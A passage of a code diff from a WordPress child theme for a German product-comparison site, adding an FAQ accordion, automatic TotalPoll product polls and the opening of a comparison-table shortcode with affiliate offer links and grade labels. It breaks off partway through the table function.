+                                Fragen und Antworten zu <?php echo esc_html($title); ?>
+                            </h4>
+                            <div class="tv-product__faq-list" role="list">
+                                <?php foreach ($faq_data as $faq_index => $item): ?>
+                                <?php $item_id = $faq_id . '-' . $faq_index; ?>
+                                <div class="tv-product__faq-item" role="listitem">
+                                    <button class="tv-product__faq-question" 
+                                            type="button"
+                                            aria-expanded="false" 
+                                            aria-controls="<?php echo esc_attr($item_id); ?>"
+                                            id="btn-<?php echo esc_attr($item_id); ?>">
+                                        <span><?php echo esc_html(wp_strip_all_tags($item["question"])); ?></span>
+                                        <span class="tv-product__faq-toggle" aria-hidden="true">+</span>
+                                    </button>
+                                    <div class="tv-product__faq-answer" 
+                                         id="<?php echo esc_attr($item_id); ?>"
+                                         role="region"
+                                         aria-labelledby="btn-<?php echo esc_attr($item_id); ?>"
+                                         hidden>
+                                        <?php echo $item['answer']; ?>
+                                    </div>
+                                </div>
+                                <?php endforeach; ?>
+                            </div>
+                        </section>
+                        <?php endif; ?>
+                        
+                    </div>
+                </div>
+                
+                <!-- Footer -->
+                <footer class="tv-product__footer">
+                    <span class="tv-product__footer-partner">
+                        Verfügbar bei <strong><?php echo esc_html(ucfirst($partnerName ?: 'Amazon')); ?></strong>
+                    </span>
+                    <span class="tv-product__footer-site">test-vergleiche.com</span>
+                </footer>
+                
+            </article>
+            <?php
+        }
+        ?>
+        </section>
+        
+        <!-- FAQ Accordion JavaScript -->
+        <script>
+        (function() {
+            document.querySelectorAll('.tv-product__faq-question').forEach(function(btn) {
+                btn.addEventListener('click', function() {
+                    var expanded = this.getAttribute('aria-expanded') === 'true';
+                    var answer = document.getElementById(this.getAttribute('aria-controls'));
+                    var toggle = this.querySelector('.tv-product__faq-toggle');
+                    
+                    this.setAttribute('aria-expanded', !expanded);
+                    if (expanded) {
+                        answer.setAttribute('hidden', '');
+                        toggle.textContent = '+';
+                    } else {
+                        answer.removeAttribute('hidden');
+                        toggle.textContent = '−';
+                    }
+                });
+                
+                // Keyboard support
+                btn.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        e.preventDefault();
+                        this.click();
+                    }
+                });
+            });
+        })();
+        </script>
+        </div>
+        <?php
+        
+        $allProductsData['minprice'] = esc_html__('ca.', 'woodmart-child').' '.number_format_i18n($allProductsData['minprice'], 2).' &euro;';
+        $allProductsData['maxprice'] = esc_html__('ca.', 'woodmart-child').' '.number_format_i18n($allProductsData['maxprice'], 2).' &euro;';
+        $rows=array_filter($rows, function ($k) use ($rows) {
+            return count(array_filter($rows[$k]))>1;
+        }, ARRAY_FILTER_USE_KEY);
+
+    endif;
+    wp_reset_postdata();
+
+    $output = ob_get_contents();
+    ob_end_clean();
+
+    echo '<script type="text/javascript">var productsData = ' . json_encode($allProductsData) . ';</script>';
+
+    return tv2_strip_external_jsonld($output);
+}
+
+// function get_or_create_poll_for_page($page_id) {
+//     global $allProductsData;
+
+//     // Ensure allProductsData is populated by explicitly calling render_comparison_box if empty
+//     if (empty($allProductsData['product_name'])) {
+//         render_comparison_box([]);
+//     }
+
+//     if (empty($allProductsData['product_name'])) {
+//         error_log("*** No product names found in allProductsData ***");
+//         return null;
+//     }
+
+//     $existing_poll = new WP_Query([
+//         'post_type' => 'poll',
+//         'meta_key' => '_poll_page_id',
+//         'meta_value' => $page_id,
+//         'posts_per_page' => 1
+//     ]);
+
+//     if ($existing_poll->have_posts()) {
+//         $existing_poll->the_post();
+//         $poll_id = get_the_ID();
+//         wp_reset_postdata();
+//         return $poll_id;
+//     } else {
+//         $poll_uid = wp_generate_uuid4();
+//         $question_uid = wp_generate_uuid4();
+
+//         $choices = [];
+//         foreach ($allProductsData['product_name'] as $index => $product_name) {
+//             $product_image = isset($allProductsData['product_image'][$index]) ? $allProductsData['product_image'][$index] : '';
+//             $product_page_id = isset($allProductsData['product_page_id'][$index]) ? $allProductsData['product_page_id'][$index] : '';
+
+//             // Set up HTML structure for each choice
+//             $choices[] = [
+//                 "uid" => wp_generate_uuid4(),
+//                 "type" => "text",
+//                 "label" => "<div class='poll-choice'>
+//                                 <img src='{$product_image}' alt='{$product_name}' style='width: 50px; height: 50px; margin-right: 10px;'>
+//                                 <span>{$product_name} (Page ID: {$product_page_id})</span>
+//                             </div>",
+//                 "votes" => 0,
+//                 "votesOverride" => 0,
+//                 "collapsed" => false,
+//                 "visibility" => true
+//             ];
+//         }
+
+//         $poll_content = [
+//             "uid" => $poll_uid,
+//             "questions" => [
+//                 [
+//                     "uid" => $question_uid,
+//                     "content" => "Which Product Do you like the most?",
+//                     "settings" => [
+//                         "selection" => [
+//                             "minimum" => 1,
+//                             "maximum" => 1
+//                         ]
+//                     ],
+//                     "choices" => $choices
+//                 ]
+//             ],
+//             "design" => ["template" => "basic-template"],
+//             "settings" => []
+//         ];
+
+//         $poll_content_json = json_encode($poll_content);
+
+//         $poll_post_data = [
+//             'post_title'   => 'Product Poll for Page ' . $page_id,
+//             'post_content' => $poll_content_json,
+//             'post_status'  => 'publish',
+//             'post_type'    => 'poll'
+//         ];
+
+//         $poll_id = wp_insert_post($poll_post_data);
+
+//         if ($poll_id) {
+//             add_post_meta($poll_id, '_poll_page_id', $page_id, true);
+//             error_log("*** New Poll created for Page ID $page_id with Poll ID: $poll_id ***");
+//         } else {
+//             error_log("*** Poll creation failed for Page ID $page_id ***");
+//         }
+
+//         return $poll_id;
+//     }
+// }
+
+/*add_shortcode('page_poll', function() {
+    global $post, $allProductsData;
+
+    render_comparison_box([]);
+    $poll_id = get_or_create_poll_for_page($post->ID);
+
+    if ($poll_id) {
+        error_log('[DEBUG - TOTALPOLL] *** Displaying poll with ID: ' . $poll_id . ' ***');
+        return '<div class="totalpoll-question">
+                    <div class="totalpoll-question-content">
+                        <p>Which Product Do you like the most?</p>
+                    </div>
+                    <div class="totalpoll-choices-grid">' .
+                    do_shortcode("[totalpoll id='{$poll_id}']") .
+                    '</div>
+                    <button class="totalpoll-vote-button">Vote</button>
+                </div>';
+    } else {
+        error_log('[DEBUG - TOTALPOLL] *** Poll could not be created. Ensure products data is available. ***');
+        return 'Poll could not be created. Ensure products data is available.';
+    }
+});*/
+
+function get_or_create_poll_for_page($page_id) {
+    global $allProductsData;
+
+    // Ensure allProductsData is populated
+    if (empty($allProductsData['product_name'])) {
+        render_comparison_box([]); // This function should populate $allProductsData
+    }
+
+    // Log error if $allProductsData is still empty
+    if (empty($allProductsData['product_name'])) {
+        error_log("*** No product names found in allProductsData ***");
+        return null;
+    }
+
+    // Check if a poll already exists for this page
+    $existing_poll = new WP_Query([
+        'post_type' => 'poll',
+        'meta_key' => '_poll_page_id',
+        'meta_value' => $page_id,
+        'posts_per_page' => 1
+    ]);
+
+    if ($existing_poll->have_posts()) {
+        $existing_poll->the_post();
+        $poll_id = get_the_ID();
+        wp_reset_postdata();
+        return $poll_id; // Return the existing poll ID
+    } else {
+        // Create a new poll
+        $poll_uid = wp_generate_uuid4();
+        $question_uid = wp_generate_uuid4();
+
+        // Prepare choices
+        $choices = [];
+        foreach ($allProductsData['product_name'] as $index => $product_name) {
+            $product_image = $allProductsData['product_image'][$index] ?? '';
+            $product_thumbnail = $allProductsData['product_thumbnail'][$index] ?? '';
+            $attachment_id = $allProductsData['attachment_id'][$index] ?? null;
+
+            $choices[] = [
+                "uid" => wp_generate_uuid4(),
+                "type" => "image",
+                "label" => $product_name,
+                "votes" => 0,
+                "votesOverride" => 0,
+                "collapsed" => false,
+                "visibility" => true,
+                "image" => [
+                    "full" => $product_image,
+                    "thumbnail" => $product_image,
+                    "sizes" => [
+                        "full" => [
+                            "url" => $product_image,
+                            "height" => 300,
+                            "width" => 300,
+                            "orientation" => "landscape"
+                        ]
+                    ],
+                    "attachmentId" => $attachment_id
+                ]
+            ];
+        }
+
+        // Prepare poll content
+        $poll_content = [
+            "uid" => $poll_uid,
+            "id" => wp_generate_uuid4(),
+            "questions" => [
+                [
+                    "uid" => $question_uid,
+                    "content" => "Welcher ist Ihrer Meinung nach der beste " . get_the_title($page_id) . "-Testsieger? Entdecken Sie Bewertungen und Top-Produkte im großen Test und Vergleich!",
+                    "settings" => [
+                        "selection" => [
+                            "minimum" => 1,
+                            "maximum" => 10
+                        ]
+                    ],
+                    "choices" => $choices
+                ]
+            ],
+            "fields" => [],
+            "expressions" => [],
+            "vote" => [
+                "limitations" => [
+                    "region" => ["rules" => []],
+                    "period" => ["start" => "", "end" => ""],
+                    "quota" => ["value" => 0]
+                ],
+                "frequency" => [
+                    "cookies" => ["enabled" => true],
+                    "ip" => ["enabled" => false],
+                    "user" => ["enabled" => false],
+                    "perSession" => 1,
+                    "perUser" => 1,
+                    "perIP" => 1,
+                    "timeout" => 3600
+                ]
+            ],
+            "choices" => [
+                "sort" => [
+                    "field" => "position",
+                    "direction" => "ASC"
+                ]
+            ],
+            "results" => [
+                "sort" => [
+                    "field" => "votes",
+                    "direction" => "DESC"
+                ],
+                "visibility" => "all",
+                "untilReaching" => null,
+                "format" => "{{votesPercentage}}"
+            ],
+            "design" => [
+                "template" => "media-contest-template",
+                "text" => [
+                    "fontFamily" => "inherit",
+                    "fontWeight" => "inherit",
+                    "fontSize" => "14px",
+                    "lineHeight" => "inherit",
+                    "align" => "inherit",
+                    "transform" => "none"
+                ],
+                "colors" => [
+                    "primary" => "#2196f3",
+                    "primaryContrast" => "#ffffff",
+                    "primaryLighter" => "#64b5f6",
+                    "primaryLight" => "#42a5f5",
+                    "primaryDark" => "#1e88e5",
+                    "primaryDarker" => "#1976d2",
+                    "secondary" => "#4caf50",
+                    "secondaryContrast" => "#ffffff",
+                    "secondaryLighter" => "#a5d6a7",
+                    "secondaryLight" => "#81c784",
+                    "secondaryDark" => "#43a047",
+                    "secondaryDarker" => "#388e3c",
+                    "accent" => "#ffc107",
+                    "accentContrast" => "#ffffff",
+                    "accentLighter" => "#ffd54f",
+                    "accentLight" => "#ffca28",
+                    "accentDark" => "#ffb300",
+                    "accentDarker" => "#ffa000",
+                    "dark" => "#333333",
+                    "gray" => "#dddddd",
+                    "grayContrast" => "#333333",
+                    "grayLighter" => "#fafafa",
+                    "grayLight" => "#eeeeee",
+                    "grayDark" => "#aaaaaa",
+                    "grayDarker" => "#999999"
+                ],
+                "layout" => [
+                    "choicesPerRow" => 5,
+                    "questionsPerRow" => 1,
+                    "maxWidth" => "200%",
+                    "gutter" => "1em",
+                    "radius" => "0"
+                ],
+                "custom" => [
+                    "container" => [
+                        "colors" => [
+                            "background" => "",
+                            "border" => "",
+                            "color" => ""
+                        ],
+                        "border" => [
+                            "width" => "",
+                            "style" => "",
+                            "radius" => "3px"
+                        ]
+                    ],
+                    "question" => [
+                        "padding" => [
+                            "top" => "",
+                            "right" => "",
+                            "bottom" => "",
+                            "left" => ""
+                        ],
+                        "border" => [
+                            "width" => "",
+                            "style" => ""
+                        ],
+                        "colors" => [
+                            "background" => "",
+                            "border" => "",
+                            "color" => ""
+                        ],
+                        "text" => [
+                            "fontFamily" => "inherit",
+                            "fontSize" => "inherit",
+                            "fontWeight" => "inherit",
+                            "lineHeight" => "inherit",
+                            "transform" => "inherit",
+                            "align" => "inherit"
+                        ]
+                    ],
+                    "choice" => [
+                        "padding" => [
+                            "top" => "0.75em",
+                            "right" => "0.75em",
+                            "bottom" => "0.75em",
+                            "left" => "0.75em"
+                        ],
+                        "border" => [
+                            "width" => "1px",
+                            "style" => "solid"
+                        ],
+                        "colors" => [
+                            "background" => "",
+                            "border" => "",
+                            "color" => "",
+                            "backgroundHover" => "",
+                            "borderHover" => "",
+                            "colorHover" => "",
+                            "backgroundChecked" => "",
+                            "borderChecked" => "",
+                            "colorChecked" => ""
+                        ],
+                        "text" => [
+                            "fontFamily" => "inherit",
+                            "fontSize" => "inherit",
+                            "fontWeight" => "inherit",
+                            "lineHeight" => "inherit",
+                            "transform" => "inherit",
+                            "align" => "inherit"
+                        ]
+                    ],
+                    "votesbar" => [
+                        "padding" => [
+                            "top" => "",
+                            "right" => "",
+                            "bottom" => "",
+                            "left" => ""
+                        ],
+                        "border" => [
+                            "width" => "1px",
+                            "style" => "solid"
+                        ],
+                        "colors" => [
+                            "backgroundStart" => "",
+                            "backgroundEnd" => "",
+                            "color" => "",
+                            "border" => ""
+                        ],
+                        "text" => [
+                            "fontFamily" => "inherit",
+                            "fontSize" => "70%",
+                            "fontWeight" => "inherit",
+                            "lineHeight" => "1",
+                            "transform" => "uppercase",
+                            "align" => "inherit"
+                        ],
+                        "size" => [
+                            "height" => "3px"
+                        ],
+                        "effects" => [
+                            "duration" => "1000"
+                        ]
+                    ],
+                    "form" => [
+                        "padding" => [
+                            "top" => "1em",
+                            "right" => "",
+                            "bottom" => "1em",
+                            "left" => ""
+                        ],
+                        "border" => [
+                            "width" => "1px",
+                            "style" => "solid"
+                        ],
+                        "colors" => [
+                            "background" => "inherit",
+                            "color" => "inherit"
+                        ],
+                        "text" => [
+                            "fontFamily" => "inherit",
+                            "fontWeight" => "inherit",
+                            "fontSize" => "inherit",
+                            "lineHeight" => "inherit",
+                            "align" => "inherit",
+                            "transform" => "inherit"
+                        ],
+                        "label" => [
+                            "text" => [
+                                "align" => "inherit",
+                                "transform" => "inherit",
+                                "fontSize" => "inherit",
+                                "lineHeight" => "inherit",
+                                "fontFamily" => "inherit",
+                                "fontWeight" => "inherit"
+                            ],
+                            "padding" => [
+                                "top" => "0",
+                                "right" => "0",
+                                "bottom" => "0.5em",
+                                "left" => "0"
+                            ],
+                            "colors" => [
+                                "color" => "inherit"
+                            ]
+                        ],
+                        "input" => [
+                            "text" => [
+                                "align" => "inherit",
+                                "transform" => "inherit",
+                                "fontSize" => "inherit",
+                                "lineHeight" => "inherit",
+                                "fontFamily" => "inherit",
+                                "fontWeight" => "inherit"
+                            ],
+                            "border" => [
+                                "width" => "1px",
+                                "style" => "solid",
+                                "radius" => ""
+                            ],
+                            "padding" => [
+                                "top" => "0.5em",
+                                "right" => "0.5em",
+                                "bottom" => "0.5em",
+                                "left" => "0.5em"
+                            ],
+                            "colors" => [
+                                "color" => "",
+                                "background" => "#ffffff",
+                                "border" => "",
+                                "colorHover" => "",
+                                "backgroundHover" => "#ffffff",
+                                "borderHover" => "",
+                                "colorActive" => "",
+                                "backgroundActive" => "",
+                                "borderActive" => ""
+                            ],
+                            "shadows" => [
+                                "box" => "inset 0 3px 0 rgba(0, 0, 0, 0.05)"
+                            ]
+                        ],
+                        "error" => [
+                            "text" => [
+                                "align" => "inherit",
+                                "transform" => "inherit",
+                                "fontSize" => "inherit",
+                                "lineHeight" => "inherit",
+                                "fontFamily" => "inherit",
+                                "fontWeight" => "inherit"
+                            ],
+                            "padding" => [
+                                "top" => "0.5em",
+                                "right" => "0",
+                                "bottom" => "0",
+                                "left" => "0"
+                            ],
+                            "colors" => [
+                                "background" => "transparent",
+                                "color" => "#f44336"
+                            ]
+                        ]
+                    ],
+                    "message" => [
+                        "padding" => [
+                            "top" => "1em",
+                            "right" => "1em",
+                            "bottom" => "1em",
+                            "left" => "1em"
+                        ],
+                        "border" => [
+                            "width" => "1px",
+                            "style" => "solid"
+                        ],
+                        "colors" => [
+                            "background" => "",
+                            "border" => "",
+                            "color" => "inherit",
+                            "backgroundError" => "#fb8c00",
+                            "borderError" => "#F57C00",
+                            "colorError" => "#ffffff"
+                        ],
+                        "text" => [
+                            "fontFamily" => "inherit",
+                            "fontSize" => "inherit",
+                            "fontWeight" => "inherit",
+                            "lineHeight" => "inherit",
+                            "transform" => "inherit",
+                            "align" => "inherit"
+                        ]
+                    ],
+                    "button" => [
+                        "colors" => [
+                            "background" => "",
+                            "color" => "",
+                            "border" => "",
+                            "backgroundHover" => "",
+                            "colorHover" => "",
+                            "borderHover" => "",
+                            "backgroundPrimary" => "",
+                            "colorPrimary" => "",
+                            "borderPrimary" => "",
+                            "backgroundPrimaryHover" => "",
+                            "colorPrimaryHover" => "",
+                            "borderPrimaryHover" => ""
+                        ],
+                        "text" => [
+                            "fontFamily" => "inherit",
+                            "fontWeight" => "inherit",
+                            "fontSize" => "inherit",
+                            "lineHeight" => "1",
+                            "align" => "center",
+                            "transform" => "UPPERCASE"
+                        ],
+                        "border" => [
+                            "width" => "1px",
+                            "style" => "solid",
+                            "radius" => "3px"
+                        ],
+                        "padding" => [
+                            "top" => "1em",
+                            "right" => "1em",
+                            "left" => "1em",
+                            "bottom" => "1em"
+                        ],
+                        "shadows" => [
+                            "box" => "inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 2px 2px rgba(0, 0, 0, 0.05)"
+                        ]
+                    ]
+                ],
+                "behaviours" => [
+                    "ajax" => true,
+                    "scrollUp" => true
+                ],
+                "effects" => [
+                    "transition" => "fade",
+                    "duration" => "500"
+                ],
+                "css" => ""
+            ],
+            "notifications" => [
+                "email" => [
+                    "recipient" => "aymen.hajji@hotmail.de",
+                    "on" => ["newVote" => false]
+                ]
+            ],
+            "meta" => ["schema" => "1.0"],
+        ];
+
+        // Create the poll as a WordPress post
+        $poll_post_data = [
+            'post_title'   => get_the_title($page_id) . ' Umfrage & Bewertung',
+            'post_content' => json_encode($poll_content, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT),
+            'post_status'  => 'publish',
+            'post_type'    => 'poll'
+        ];
+
+        $poll_id = wp_insert_post($poll_post_data);
+
+        if ($poll_id) {
+            add_post_meta($poll_id, '_poll_page_id', $page_id, true);
+            //error_log("*** New Poll created for Page ID $page_id with Poll ID: $poll_id ***");
+        } else {
+            //error_log("*** Poll creation failed for Page ID $page_id ***");
+        }
+
+        return $poll_id;
+    }
+}
+
+/*add_shortcode('page_poll', function() {
+    global $post, $allProductsData;
+
+    // Ensure allProductsData is populated by calling render_comparison_box explicitly
+    render_comparison_box([]);
+    $poll_id = get_or_create_poll_for_page($post->ID);
+
+    if ($poll_id) {
+        //error_log('[DEBUG - TOTALPOLL] *** Displaying poll with ID: ' . $poll_id . ' ***');
+        return do_shortcode("[totalpoll id='{$poll_id}']");
+    } else {
+        //error_log('[DEBUG - TOTALPOLL] *** Poll could not be created. Ensure products data is available. ***');
+        return 'Poll could not be created. Ensure products data is available.';
+    }
+});*/
+
+add_shortcode( 'vergleichstabelle', 'render_comparison_table' );
+//wp_register_script('comparison-table', get_stylesheet_directory_uri() . '/js/comparison-table.js', ['jquery'], false, true);
+function render_comparison_table( $atts ) {
+    global $allProductsData, $bestProductsData, $productType;
+    // Initialize the allProductsData to hold additional information
+    $allProductsData = [
+        'champ' => '',
+        'pricechamp' => '',
+        'bestseller' => '',
+        'minprice' => '',
+        'maxprice' => '',
+        'brands' => [],
+        'products' => [],
+        //added by fatma
+        'product_ids' => [], // Add product IDs
+        'product_image' => [],
+        //end added by fatma
+    ];
+    $a = shortcode_atts( [
+        'id' => '',
+        'pid' => '',
+        'api' => false,
+        'price' => false
+    ], $atts );
+    if (empty((int)$a['id'])) return;
+    $args = array(
+        'post_type'      => 'advisor_product',
+        'posts_per_page' => -1,
+        /*
+        'orderby'  => 'meta_value_num',
+        'meta_key' => 'grade',
+        'meta_type' => 'DECIMAL',
+        'order'	=> 'ASC',
+        */
+        'meta_query' => [
+            [
+                'relation' => 'AND',
+                'flag_clause' => [
+                    'key'       => 'flag',
+                    'type'      => 'NUMERIC'
+                ],
+                'grade_clause' => [
+                    'key'       => 'grade',
+                    'type'      => 'DECIMAL(3,2)'
+                ],
+                'status_clause' => [
+                    'key' => 'status',
+                    'type' => 'NUMERIC',
+                    'value' => 1
+                ]
+            ]
+        ],
+        'orderby' => [
+            'flag_clause'       => 'DESC',
+            'grade_clause'     => 'ASC',
+        ],
+        'tax_query' => array(
+            array(
+                'taxonomy'  => 'product_type',
+                'field'     => 'id',
+                'terms'     => $a['id']
+            )
+        ),
+    );
+    if (!empty((int)$a['pid'])) $args['post__in']=(array)((int)$a['pid']);
+    ob_start();
+    $product_attributes = get_field('product_attributes', 'product_type_' . $a['id']);
+    if (empty($product_attributes)) return;
+    $specifics=$specifics_input=$rows=[];
+    foreach ($product_attributes as $attribute) {
+        $specifics['field_specific_'.sanitize_title($attribute['attribute_name'])]=__($attribute['attribute_name'], 'woodmart-child');
+        $specifics_input['field_specific_'.sanitize_title($attribute['attribute_name'])]=$attribute['input_field'];
+    }
+
+    $features1=[
+        'image'=>__('Picture', 'woodmart-child'),
+        'model'=>__('Model', 'woodmart-child'),
+        'details'=>__('Details', 'woodmart-child'),
+        'brand'=>__('Brand', 'woodmart-child'),
+        'grade'=>__('Grade', 'woodmart-child'),
+        ];
+    $features2=[
+        'advantages'=>__('Advantages', 'woodmart-child'),
+        'disadvantages'=>__('Disadvantages', 'woodmart-child'),
+        'conclusion'=>__('Conclusion', 'woodmart-child'),
+        'offer'=>__('To offer', 'woodmart-child'),
+    ];
+    if ($a['price']) {
+        $features2=[
+            'advantages'=>__('Advantages', 'woodmart-child'),
+            'disadvantages'=>__('Disadvantages', 'woodmart-child'),
+            'conclusion'=>__('Conclusion', 'woodmart-child'),
+            'price' => __('Price', 'woodmart-child'),
+            'offer'=>__('To offer', 'woodmart-child'),
+        ];
+    }
+
+    $header = array_merge($features1, $specifics, $features2);
+    foreach ($header as $index=>$item) {
+        $rows[$index][]=$item;
+    }
+
+    ?>
+
+
+    <?php
+    $query = new WP_Query($args);
+    //file_put_contents('out.txt', var_export($query, true));
+    if($query->have_posts()) :
+        // enqueue style and js for comparison table
+        //wp_enqueue_style( 'comparison-table', get_stylesheet_directory_uri() . '/css/comparison-table.css', array('bootstrap') );
+        //wp_enqueue_script('comparison-table');
+        $found_products=$query->post_count;
+        $flagMapping=[];
+        $upload_dir=wp_get_upload_dir();
+        $merchant_dir='merchants';
+        while ($query->have_posts()) {
+            $query->the_post();
+            $current_post_id = get_the_ID();
+            
+            $title = get_the_title();
+
+
+            /*added by fatma*/
+            $allProductsData['product_ids'][] = $current_post_id;
+            $allProductsData['product_image'][] = get_the_post_thumbnail_url(get_the_ID(), 'thumbnail');
+            /*end added by fatma*/
+
+            $internalLink=$externalLink=get_the_permalink();
+            $externalLinkTarget='_self';
+            $offers=[];
+            if(have_rows('offers')):
+                while(have_rows('offers')) : the_row();
+                    $offers[]=[
+                                'partner'=>get_sub_field('partner_identifier'),
+                                'url'=>get_sub_field('url'),
+                                'price'=>(float)str_replace(',', '.', get_sub_field('price')),
+                                'special_price'=>get_sub_field('special_price'),
+                            ];
+                    $price = (float)str_replace(',', '.', get_sub_field('price'));
+                    $special_price = (float)str_replace(',', '.', get_sub_field('special_price'));
+                    if ($special_price>0)
+                        $price = $special_price;
+                    if (!empty($allProductsData['minprice'])) {
+                        $allProductsData['minprice'] = min($allProductsData['minprice'],$price);
+                    } else {
+                        $allProductsData['minprice']=$price;
+                    }
+                    $allProductsData['maxprice']=max((float)$allProductsData['maxprice'],$price);
+                endwhile;
+            endif;
+
+            $partnerLogo='';
+            if (!empty($offers)) :
+                $amazon_offer=array_search('amazon', array_combine(array_keys($offers), array_column($offers, 'partner')));
+                if (!empty($amazon_offer)):
+                    $targetUrl=$offers[$amazon_offer]['url'];
+                    $partnerName=$offers[$amazon_offer]['partner'];
+                    //$price = ($offers[$amazon_offer]['special_price']>0)?$offers[$amazon_offer]['special_price']:$offers[$amazon_offer]['price'];
+                else:
+                    $targetUrl=$offers[0]['url'];
+                    $partnerName=$offers[0]['partner'];
+                    //$price = ($offers[0]['special_price']>0)?$offers[0]['special_price']:$offers[0]['price'];
+                endif;
+                $externalLinkTarget='_blank';
+                if ($a['api']):
+                    $externalLink=$targetUrl;
+                else:
+                    $externalLink=add_query_arg(
+                                            [
+                                                'to'=>external_link_encrypt_decrypt('encrypt', $targetUrl),
+                                            ],
+                                            get_permalink(get_page_by_path( 'go' ))
+                                        );
+                endif;
+                if (!defined('DS')) define('DS', DIRECTORY_SEPARATOR);
+                $partnerLogoName=$partnerName.'.png';
+                if (file_exists($upload_dir['basedir'].DS.$merchant_dir.DS.$partnerName.'.png')):
+                    $partnerLogo="<img src='{$upload_dir['baseurl']}/{$merchant_dir}/{$partnerLogoName}' class='ct-merchant-logo' alt='{$partnerName}' />";
+                endif;
+            endif;
+            $allProductsData['products'][] = "<a href='{$externalLink}' target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+
+            $title=get_the_title();
+            $image=get_the_post_thumbnail(null, 'thumbnail', ['class'=>'cd-product-image', 'alt'=>$title]);
+            $image_url_table = get_the_post_thumbnail_url(get_the_ID(), 'medium');
+            $rows['model'][]="<a href='{$externalLink}' class='product-name-link' target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+            $rows['details'][]="<div class='product-details'>
+                                        <a href='{$internalLink}'>".__('View Product Details', 'woodmart-child')." <i class='fas fa-chevron-right'></i></a>
+                                    </div>";
+            $allProductsData['products'][]="<a href='{$externalLink}' target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+            $brand='';
+            $brandTerms=get_the_terms(get_the_ID(), 'brand' );
+            if (is_array($brandTerms) && count($brandTerms)==1) {
+                $brand = $brandTerms[0]->name;
+                $allProductsData['brands'][]="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$brand}</a>";
+            }
+            $rows['brand'][]=$brand;
+            foreach (array_keys($specifics) as $specific) {
+                $specific_value=get_post_meta($current_post_id, $specific, true);
+                if (isset($specifics_input[$specific])):
+                    switch ($specifics_input[$specific]):
+                        case 'boolean': $specific_value='<div class="text-center"><i class="fas '.(($specific_value==1)?'fa-check color-green':'fa-times color-red').' fa-lg"></i></div>';
+                            break;
+                        case 'textarea':
+                            break;
+                    endswitch;
+                endif;
+                $rows[$specific][]=$specific_value;
+            }
+            $rows['advantages'][]=text_to_list(get_field('advantages'),'list-unstyled advantages', '<i class="fas fa-plus-square mr-2 color-green"></i>');
+            $rows['disadvantages'][]=text_to_list(get_field('disadvantages'),'list-unstyled disadvantages', '<i class="fas fa-minus-square mr-2 color-red"></i>');
+            $rows['conclusion'][]=get_field('conclusion');
+            if ($a['price']) {
+                $priceLabel = (isset($price) && $price > 0) ? "<span class='price-prefix'>".esc_html__('ca.', 'woodmart-child')."</span> ".number_format_i18n($price, 2).' EUR' : __('Check price', 'woodmart-child');
+                $rows['price'][]="<a class='price-link' href='{$externalLink}' target='{$externalLinkTarget}' rel='nofollow noopener sponsored'>".$priceLabel."</a>";
+            }
+            $rows['offer'][]="{$partnerLogo}<a class='btn btn-offer' href='{$externalLink}' target='{$externalLinkTarget}' rel='nofollow noopener sponsored'>".__('To Offer', 'woodmart-child')."</a>";
+            $flag=get_field('flag');
+            $flagMapping[]=(!empty($flag)&&$found_products>1)?'flag-'.$flag:'';
+            $awardText='';
+            switch ($flag) {
+                case 100:
+                        $awardText=esc_html__('Best recommendation', 'woodmart-child');
+                        $allProductsData['champ']="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+                        $bestProductsData['champ']=[
+                            'id' => get_the_ID(),
+                            'name' => $title,
+                            'image' => $image_url_table,
+                            'link' => $externalLink,
+                            'btn' => "<a class='btn btn-offer' href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>".__('To Offer', 'woodmart-child')."</a>",
+                            'rating' => do_shortcode('[kk-star-ratings id="'.get_the_ID().'" readonly]'),
+                        ];
+                        // siegel
+                        $test_label=__('<b>Best</b> Recommendation', 'woodmart-child');
+                        $siegelClass='siegel_testChamp';
+                    break;
+                case 50:
+                        $awardText=esc_html__('Best price', 'woodmart-child');
+                        $allProductsData['pricechamp']="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+                        $bestProductsData['pricechamp']=[
+                            'id' => get_the_ID(),
+                            'name' => $title,
+                            'image' => $image_url_table,
+                            'link' => $externalLink,
+                            'btn' => "<a class='btn btn-offer' href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>".__('To Offer', 'woodmart-child')."</a>",
+                            'rating' => do_shortcode('[kk-star-ratings id="'.get_the_ID().'" readonly]'),
+                        ];
+                        // siegel
+                        $test_label=__('<b>Best</b>Price', 'woodmart-child');
+                        $siegelClass='siegel_priceChamp';
+                    break;
+                case 10:
+                        $awardText=esc_html__('Bestseller', 'woodmart-child');
+                        $allProductsData['bestseller']="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+                        // siegel
+                        $test_label=__('<b>Top</b> Product', 'woodmart-child');
+                        $siegelClass='siegel_topProduct';
+                    break;
+                default:
+                        // siegel
+                        $test_label=__('<b>Top</b> Product', 'woodmart-child');
+                        $siegelClass='siegel_topProduct';
+            }
+            $awardClass=(!empty($flag)&&$found_products>1)?'award-'.$flag:'';
+            $rows['image'][]="<div class='award {$awardClass}'>{$awardText}</div> <a href='{$externalLink}' target='{$externalLinkTarget}' rel='nofollow noopener sponsored'><div class='ct-image'>{$image}</div></a>";
+            // Siegel zunaechst provisorisch
+            $test_note=get_field('grade');
+            if(trim($test_note)!="") {
+                $testNote='<a href="'.$externalLink.'" rel="nofollow noopener sponsored" target="_blank"><div class="testNote '.$siegelClass.'">';
+                if ($a['api']):
+                    $testNote.='<span class="testLabel">'.$test_label.'</span><span class="blogName">#BLOGNAME#</span>';
+                else:
+                    $testNote.='<span class="testLabel">'.$test_label.'</span><span class="blogName">test-vergleiche.com</span>';
+                endif;
+                if($test_note>=1 && $test_note<=1.5) {
+                    $praedikat=__('Very Good', 'woodmart-child');
+                } elseif ($test_note>1.5 && $test_note<=2.5) {
+                    $praedikat=__('Good', 'woodmart-child');
+                } elseif ($test_note>2.5 && $test_note<=3.5) {
+                    $praedikat=__('Satisfying', 'woodmart-child');
+                } elseif ($test_note>3.5 && $test_note<=4) {
+                    $praedikat=__('Sufficient', 'woodmart-child');
